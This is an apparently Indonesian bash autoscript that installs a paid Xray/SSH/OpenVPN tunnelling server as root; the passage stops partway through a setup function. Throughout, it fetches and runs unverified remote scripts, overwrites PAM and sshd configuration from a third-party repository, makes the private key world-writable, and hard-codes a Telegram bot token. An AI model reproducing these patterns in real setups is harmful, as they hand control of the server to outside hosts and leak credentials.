#!/bin/bash
# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition 3.0 Latest version
# Author  : Yogz Project
# (C) Copyright 2024
# =========================================

rm -rf /root/deb10-ub20-v1.sh > /dev/null 2>&1
is_root
source '/etc/kyt/var.txt'
clear
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'
start=$(date +%s)
TIME="10"
CHATID="5795571992"
KEY="6386703502:AAGiUjNES9aXxBWzuqNTiqDBDqd0uLcGFAs"
URL="https://api.telegram.org/bot$KEY/sendMessage"
YOGZ_VPN="https://raw.githubusercontent.com/waru88/v3/main/"
YOGZ_VPNN="https://raw.githubusercontent.com/waru88/v3/main/"
#########################
KANAN="\033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m$NC"
KIRI="\033[1;32m>\033[1;33m>\033[1;31m>\033[1;31m$NC"
#########################

LOGO() {
    echo -e ""
    echo -e "    ┌───────────────────────────────────────────────┐"
    echo -e " ───│                                               │───"
    echo -e " ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───"
    echo -e " ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───"
    echo -e " ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───"
    echo -e "    │    ${YELLOW}Copyright${FONT} (C)${YELLOW}https://t.me/YSSHstore     $NC   │"
    echo -e "    └───────────────────────────────────────────────┘"
    echo -e "         ${RED}Autoscript xray vpn lite (multi port)${FONT}    "
    echo -e "${RED}Make sure the internet is smooth when installing the script${FONT}"
    echo -e "        "

}
clear
export IP=$( curl -sS ipinfo.io/ip )
clear
clear && clear && clear
clear;clear;clear

echo -e "${YELLOW}─────────────────────────────────────────────────${NC}"
echo -e "  Welcome To YSSHstore Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "     This Will Quick Setup VPN Server On Your Server"
echo -e "         Author : ${green}YogzVPN  ${NC}${YELLOW}(${NC} ${green}Project ${NC}${YELLOW})${NC}"
echo -e "       © Recode By YSSHstore ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}─────────────────────────────────────────────────${NC}"
echo ""
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
else
    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
    exit 1
fi

if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
    exit 1
fi

if [[ $IP == "" ]]; then
    echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
else
    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
fi
sleep 3
echo ""
clear
echo -e "Wait Process Installation Script Premium"
echo ""
sleep 5

#########################
secs_to_human() {
    echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
}
function print_ok() {
    echo -e "${BLUE}[INFO]${FONT} ${KIRI}${YELLOW} $1 ${FONT}"
    sleep 0.5
}

function print_error() {
    echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}

function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Root user Start installation process"
    else
        print_error "The current user is not the root user, please switch to the root user and run the script again"
    fi

}
BOLONG() {
    if [[ 0 -eq $? ]]; then
        print_ok "$1 ${FONT}"
        sleep 0.5
    fi
}
function first_setup(){
    clear
    BOLONG "Starting Installasi Directory"
    mkdir -p /etc/xray
    curl -s ifconfig.me > /etc/xray/ipvps
    touch /etc/xray/domain
    mkdir -p /var/log/xray
    chown www-data.www-data /var/log/xray
    chmod +x /var/log/xray
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    # // Ram Information
    while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
    esac
    done < /proc/meminfo
    Ram_Usage="$((mem_used / 1024))"
    Ram_Total="$((mem_total / 1024))"
    export TIMES=`date -d "0 days" +"%d-%m-%Y - %X" `
    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
    export Kernel=$( uname -r )
    export Arch=$( uname -m )
    export IP=$( curl -s https://ipinfo.io/ip/ )
    export ISP=$(wget -qO- ipinfo.io/org)
    export CITY=$(wget -qO- ipinfo.io/city)
    
    # Set timezone
    timedatectl set-timezone Asia/Jakarta

    # Configure iptables-persistent
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections

    # Load OS information
    source /etc/os-release

    if [[ "$ID" == "ubuntu" ]]; then
        echo "Setup dependencies for OS: $PRETTY_NAME"
        sudo apt update -y
        apt-get install --no-install-recommends software-properties-common -y
        add-apt-repository ppa:vbernat/haproxy-2.0 -y
        apt-get update -y
        apt-get install haproxy=2.0.* -y
    elif [[ "$ID" == "debian" ]]; then
        echo "Setup dependencies for OS: $PRETTY_NAME"
        curl -fsSL https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor -o /usr/share/keyrings/haproxy.debian.net.gpg
        echo "deb [signed-by=/usr/share/keyrings/haproxy.debian.net.gpg] http://haproxy.debian.net $(lsb_release -cs)-backports main" > /etc/apt/sources.list.d/haproxy.list
        apt-get update -y
        apt-get install haproxy -y
    else
        echo -e "Your OS is not supported ($PRETTY_NAME)"
        exit 1
    fi
BOLONG "Successfully Installasi Directory"
}

function nginx_install() {
    clear
    BOLONG "Starting Installasi Nginx"
    os_id=$(cat /etc/os-release | grep '^ID=' | awk -F= '{print $2}' | tr -d '"')
    os_version=$(cat /etc/os-release | grep '^VERSION_ID=' | awk -F= '{print $2}' | tr -d '"')

    if [[ $os_id == "debian" && $os_version == "11" ]]; then
        echo "Setting up nginx for Debian 11"
        apt -y install nginx
    elif [[ $os_id == "ubuntu" && $os_version == "20.04" ]]; then
        echo "Setting up nginx for Ubuntu 20.04"
        sudo apt-get install nginx -y
    else
        echo "Your OS (ID: $os_id, Version: $os_version) is not supported for nginx installation."
    fi
    BOLONG "Successfully Installasi Nginx"
}

function base_package() {
clear
BOLONG "Starting Installasi Service"
apt install zip pwgen openssl netcat socat cron bash-completion -y
apt dist-upgrade -y
chronyc sourcestats -v
chronyc tracking -v
apt install ntpdate -y
ntpdate pool.ntp.org
apt install figlet -y
sudo apt-get clean all
sudo apt-get autoremove -y
sudo apt-get install -y debconf-utils
sudo apt-get remove --purge exim4 -y
sudo apt-get remove --purge ufw firewalld -y
apt install git -y
apt install jq -y
apt install psmisc -y
apt install socat -y
sudo apt-get install -y --no-install-recommends software-properties-common
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa tmux dropbear squid at
BOLONG "Successfully Installasi Service"
}

function add_domain() {
clear
echo -e ""
LOGO
echo -e "   ──────────────────────────────"
echo -e "  |\e[1;32mPlease Select a Domain Type Below \e[0m|"
echo -e "   ──────────────────────────────"
echo -e "     \e[1;32m1)\e[0m Enter Your Domain Pribadi"
echo -e "     \e[1;32m2)\e[0m Use a Random Domain"
echo -e "   ──────────────────────────────"
read -p "   Please select numbers 1-2 or Any Button(Random) : " choose_domain
echo ""
if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain
Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://waru88.github.io/v3/ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
Domain_Hasil_Random=$( curl -s https://waru88.github.io/v3/ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c5 | tr -d '\r' | tr -d '\r\n')"
EMAIL_CLOUDFLARE="email@gmail.com"
API_KEY_CLOUDFLARE="apikey"
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" | jq -r .result[0].id)
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}' | jq -r .result.id)
RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}')
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" | jq -r .result[0].id)
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":true}' | jq -r .result.id)
RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":true}')
echo "$SUB_DOMAIN.$Domain_Hasil_Random" > /etc/xray/domain
echo "$SUB_DOMAIN.$Domain_Hasil_Random" > /root/domain
domain="${SUB_DOMAIN}.${Domain_Hasil_Random}"
clear
BOLONG "Starting Generating Certificate"
rm -rf /etc/xray/xray.key
rm -rf /etc/xray/xray.crt
domain=$(cat /root/domain)
STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
rm -rf /root/.acme.sh
mkdir /root/.acme.sh
systemctl stop $STOPWEBSERVER
systemctl stop nginx
curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
chmod 777 /etc/xray/xray.key
wget -q ${YOGZ_VPN}slowdns/ns.sh && chmod +x ns.sh && ./ns.sh
echo -e " "
echo -e "${OKEY} Your Domain : $SUB_DOMAIN.$Domain_Hasil_Random ${NC}"
sleep 4
systemctl restart nginx > /dev/null 2>&1
elif [[ $choose_domain == "1" ]]; then
clear
clear && clear && clear
clear;clear;clear
echo -e ""
LOGO
read -p "  Input Your Domain : " host
echo $host > /etc/xray/domain
echo $host > /root/domain
clear
BOLONG "Starting Generating Certificate"
rm -rf /etc/xray/xray.key
rm -rf /etc/xray/xray.crt
domain=$(cat /root/domain)
STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
rm -rf /root/.acme.sh
mkdir /root/.acme.sh
systemctl stop $STOPWEBSERVER
systemctl stop nginx
curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
chmod 777 /etc/xray/xray.key
wget -q ${YOGZ_VPN}slowdns/ns.sh && chmod +x ns.sh && ./ns.sh
echo -e ""
echo -e "${green} Your Domain : $domain ${NC}"
sleep 2
echo -e ""
else
echo -e "${EROR} Please Choose 1 & 2 Only ! ${NC}"
exit 1
fi
BOLONG "Successfully Generating Certificate"
}

function make_folder_xray() {
rm -rf /etc/vmess/.vmess.db
rm -rf /etc/vless/.vless.db
rm -rf /etc/trojan/.trojan.db
rm -rf /etc/shadowsocks/.shadowsocks.db
rm -rf /etc/ssh/.ssh.db
rm -rf /etc/bot/.bot.db
rm -rf /etc/noobzvpns/.noobzvpns.d
mkdir -p /root/.config/rclone
mkdir -p /etc/xray
mkdir -p /etc/vmess
mkdir -p /etc/vless
mkdir -p /etc/trojan
mkdir -p /etc/shadowsocks
mkdir -p /etc/ssh
mkdir -p /etc/bot
mkdir -p /etc/noobzvpns
mkdir -p /usr/bin/xray/
mkdir -p /var/log/xray/
mkdir -p /var/www/html
chmod +x /var/log/xray
touch /etc/xray/domain
touch /var/log/xray/access.log
touch /var/log/xray/error.log
touch /etc/vmess/.vmess.db
touch /etc/vless/.vless.db
touch /etc/trojan/.trojan.db
touch /etc/shadowsocks/.shadowsocks.db
touch /etc/ssh/.ssh.db
touch /etc/bot/.bot.db
touch /etc/noobzvpns/.noobzvpns.db
echo "& plughin Account" >>/etc/vmess/.vmess.db
echo "& plughin Account" >>/etc/vless/.vless.db
echo "& plughin Account" >>/etc/trojan/.trojan.db
echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
echo "& plughin Account" >>/etc/ssh/.ssh.db
echo "& plughin Account" >>/etc/noobzvpns/.noobzvpns.db
}

function install_xray() {
clear
BOLONG "Instalasi Xray Latest Version"
domain=$(cat /etc/xray/domain)
IPVPS=$(cat /etc/xray/ipvps)
curl -s ipinfo.io/city >>/etc/xray/city
curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
curl https://rclone.org/install.sh | bash
printf "q\n" | rclone config
wget -O /root/.config/rclone/rclone.conf "${YOGZ_VPN}backup/rclone.conf" >/dev/null 2>&1
wget -O /etc/xray/config.json "${YOGZ_VPN}xray/config.jsonn" >/dev/null 2>&1
#wget -O /etc/xray/vmess.json "${YOGZ_VPN}xray/vmess.json" >/dev/null 2>&1
#wget -O /etc/xray/vless.json "${YOGZ_VPN}xray/vless.json" >/dev/null 2>&1
#wget -O /etc/xray/trojan.json "${YOGZ_VPN}xray/trojan.json" >/dev/null 2>&1
#wget -O /etc/xray/shadowsocks.json "${YOGZ_VPN}xray/shadowsocks.json" >/dev/null 2>&1
wget -O /etc/systemd/system/runn.service "${YOGZ_VPN}xray/runn.service" >/dev/null 2>&1
wget -q -O /etc/squid/squid.conf "https://waru88.github.io/v3/ssh/squid.conf" >/dev/null 2>&1
wget -O /etc/haproxy/haproxy.cfg "${YOGZ_VPN}xray/haproxy.cfg" >/dev/null 2>&1
wget -O /etc/nginx/conf.d/xray.conf "${YOGZ_VPN}xray/xray.conf" >/dev/null 2>&1

cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem

   chmod +x /etc/systemd/system/runn.service
rm -rf /etc/systemd/system/xray.service.d
cat >/etc/systemd/system/xray.service <<EOF
[Unit]
Description=Xray Service
Documentation=https://github.com/waru88
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF
echo -e ""
BOLONG "Succesfully Installed Xray"
}

function ins_ssh(){
clear
BOLONG "Instalasi Password SSH"
wget -O /etc/pam.d/common-password "${YOGZ_VPN}ssh/password"
chmod +x /etc/pam.d/common-password
DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "

cd

# Edit file /etc/systemd/system/rc-local.service
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END

# nano /etc/rc.local
cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END

# Ubah izin akses
chmod +x /etc/rc.local

# enable rc local
systemctl enable rc-local
systemctl start rc-local.service
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
BOLONG "Successfully Installed Password SSH"
}

function udp_mini(){
clear
BOLONG "Instalasi Limit & Udp Custom"
wget -q ${YOGZ_VPN}limit/limit.sh && chmod +x limit.sh && ./limit.sh >/dev/null 2>&1
cd
wget -q ${YOGZ_VPNN}udp-custom.sh && chmod +x udp-custom.sh && ./udp-custom.sh >/dev/null 2>&1
cd
# // Install UDP Mini
mkdir -p /usr/local/kyt/
wget -q -O /usr/local/kyt/udp-mini "${YOGZ_VPN}badvpn/udp-mini"
chmod +x /usr/local/kyt/udp-mini
wget -q -O /etc/systemd/system/udp-mini-1.service "${YOGZ_VPN}badvpn/udp-mini-1.service"
wget -q -O /etc/systemd/system/udp-mini-2.service "${YOGZ_VPN}badvpn/udp-mini-2.service"
wget -q -O /etc/systemd/system/udp-mini-3.service "${YOGZ_VPN}badvpn/udp-mini-3.service"
systemctl disable udp-mini-1
systemctl stop udp-mini-1
systemctl enable udp-mini-1
systemctl start udp-mini-1
systemctl disable udp-mini-2
systemctl stop udp-mini-2
systemctl enable udp-mini-2
systemctl start udp-mini-2
systemctl disable udp-mini-3
systemctl stop udp-mini-3
systemctl enable udp-mini-3
systemctl start udp-mini-3
BOLONG "Successfully installed Limit & UDP Custom"
}

function ins_SSHD(){
clear
BOLONG "Instalasi SSHD"
wget -q -O /etc/ssh/sshd_config "${YOGZ_VPN}ws/sshd" >/dev/null 2>&1
chmod 700 /etc/ssh/sshd_config
BOLONG "Successfully Installed SSHD"
}

function ins_dropbear(){
clear
BOLONG "Instalasi Dropbear"
wget -q -O /etc/default/dropbear "${YOGZ_VPN}ssh/dropbear" >/dev/null 2>&1
echo "Banner /etc/banner.com" >>/etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.com"@g' /etc/default/dropbear
wget -O /etc/banner.com "${YOGZ_VPN}ssh/issue.net"
chmod +x /etc/default/dropbear
/etc/init.d/dropbear restart
/etc/init.d/dropbear status
BOLONG "Successfully Installed Dropbear"
}

function ins_vnstat(){
clear
BOLONG "Instalasi Vnstat"
apt -y install vnstat > /dev/null 2>&1
apt -y install libsqlite3-dev > /dev/null 2>&1
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6
BOLONG "Successfully Installed Vnstat"
}

function ins_openvpn(){
clear
BOLONG "Instalasi Openvpn"
wget -q ${YOGZ_VPN}ssh/openvpn &&  chmod +x openvpn && ./openvpn >/dev/null 2>&1
BOLONG "Successfully Installed Openvpn"
clear
}

function ins_swab(){
clear
BOLONG "Instalasi Swap 1G"
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
    gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
    curl -sL "$gotop_link" -o /tmp/gotop.deb
    dpkg -i /tmp/gotop.deb >/dev/null 2>&1
    
        # > Buat swap sebesar 1G
    dd if=/dev/zero of=/swapfile bs=1024 count=1048576
    mkswap /swapfile
    chown root:root /swapfile
    chmod 0600 /swapfile >/dev/null 2>&1
    swapon /swapfile >/dev/null 2>&1
    sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab

    # > Singkronisasi jam
    chronyd -q 'server 0.id.pool.ntp.org iburst'
    chronyc sourcestats -v
    chronyc tracking -v
    
    wget -q ${YOGZ_VPN}bbr.sh &> /dev/null &&  chmod +x bbr.sh && ./bbr.sh
    BOLONG "Successfully Installed Swap 1G"
    clear
}

function ins_Ddos(){
clear
BOLONG "Instalasi DDoS Deflate"
# Instal DDOS Flate
wget -qO /usr/sbin/ddos.zip "https://jaka1m.github.io/project/ssh/ddos.zip" >/dev/null 2>&1
unzip /usr/sbin/ddos.zip -d /usr/sbin/
rm -rf /usr/sbin/ddos.zip
chmod +x /usr/sbin/ddos-deflate-master/*
cd /usr/sbin/ddos-deflate-master
./uninstall.sh && ./install.sh
BOLONG "Successfully Installed DDoS Deflate"
}

function ins_epro(){
BOLONG "Instalasi SSH"
clear
wget -O /usr/bin/ws "${YOGZ_VPN}ws/ws" >/dev/null 2>&1
wget -O /usr/bin/tun.conf "${YOGZ_VPN}ws/tun.conf" >/dev/null 2>&1
wget -O /etc/systemd/system/ws.service "${YOGZ_VPN}ws/ws.service" >/dev/null 2>&1
wget -q -O /etc/ipserver "${YOGZ_VPN}ssh/ipserver" && bash /etc/ipserver >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
wget -O /usr/sbin/ftvpn "${YOGZ_VPN}ws/ftvpn" >/dev/null 2>&1
chmod +x /usr/sbin/ftvpn
chmod +x /etc/systemd/system/ws.service
chmod +x /usr/bin/ws
chmod 644 /usr/bin/tun.conf
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload
cd
apt autoclean -y >/dev/null 2>&1
apt autoremove -y >/dev/null 2>&1
BOLONG "Successfully Installed SSH"
}

function menu(){
clear
wget ${YOGZ_VPNN}menu.zip
unzip menu.zip 
chmod +x *
mv * /usr/bin/
cd /usr/bin/
rm -rf menu.zip
cd
}

function profile(){
clear
    # Setup untuk file ~/.profile
    cat >/root/.profile <<EOF
# ~/.profile: executed by Bourne-compatible login shells.
if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
mesg n || true
menu
EOF

# Cron untuk xp_all
cat >/etc/cron.d/xp_all <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
5 0 * * * root /usr/bin/xp
END

# Cron untuk logclean
cat >/etc/cron.d/logclean <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/59 * * * * root /usr/bin/logclean
END

# Cron untuk xraylimit
cat >/etc/cron.d/x_limp <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/bin/xraylimit
END

# Cron untuk bottelegram
cat >/etc/cron.d/bckp_bot <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
10 0 * * * root /usr/bin/bottelegram
END

# Cron untuk botautoexp
cat >/etc/cron.d/bot_exp <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/30 * * * * root /usr/bin/botautoexp
END

# Izin untuk file cron
chmod 644 /root/.profile

# Cron untuk reboot harian
cat >/etc/cron.d/daily_reboot <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 3 * * * root /sbin/reboot
END

# Cron untuk membersihkan log nginx dan xray setiap menit
echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
